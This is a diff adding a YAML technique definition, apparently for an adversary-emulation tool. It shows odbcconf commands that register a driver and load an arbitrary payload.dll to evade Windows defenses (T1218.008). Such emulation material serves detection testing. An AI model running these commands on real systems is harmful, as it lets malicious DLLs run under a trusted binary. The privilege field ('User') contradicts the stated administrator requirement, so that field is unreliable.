@@ -1,0 +1,25 @@
+- id: f8912944-e1fa-3c68-b682-d54b0a68bba1
+  name: Odbcconf.exe - Install a driver and load the DLL. Requires administrator privileges.
+  description: Install a driver and load the DLL. Requires administrator privileges.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.008
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'odbcconf INSTALLDRIVER "lolbas-project|Driver=payload.dll|APILevel=2"
+
+          odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"'
+        payloads:
+        - payload.dll
+  singleton: true
+  privilege: User
+  repeatable: false
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
